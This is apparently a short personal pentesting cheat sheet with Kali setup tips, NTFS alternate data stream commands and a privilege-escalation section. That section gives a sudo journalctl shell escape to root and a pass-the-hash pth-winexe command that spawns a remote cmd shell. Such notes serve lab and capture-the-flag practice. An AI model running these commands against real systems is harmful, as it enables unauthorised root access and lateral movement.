# General
## Kali Configuration
```bash
## set keyboard layout
setxkbmap -layout de
# set timezone
sudo dpkg-reconfigure tzdata
```

## Find without errors
```bash
find / -name test.py 2>/dev/null
```

## Save all Terminal Output to File
https://unix.stackexchange.com/questions/200637/save-all-the-terminal-output-to-a-file
```bash
# Convert RAW Output to TXT
cat $SCRIPT_LOG_FILE | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b > $txtfile
```

## NTFS Alternate Datastream
```bash
# show alternate datastreams
dir /R

# output alternate datastreams
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```
# Privesc
## LinEnum.sh
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

## GTFOBIns
https://gtfobins.github.io/ 

## journalctl
```bash
# size termain windows very small
usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/sh
# whoami
root
```

## Pass-the-Hash spawn CMD
```bash
pth-winexe -U$domain/$username%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //$ip cmd
```
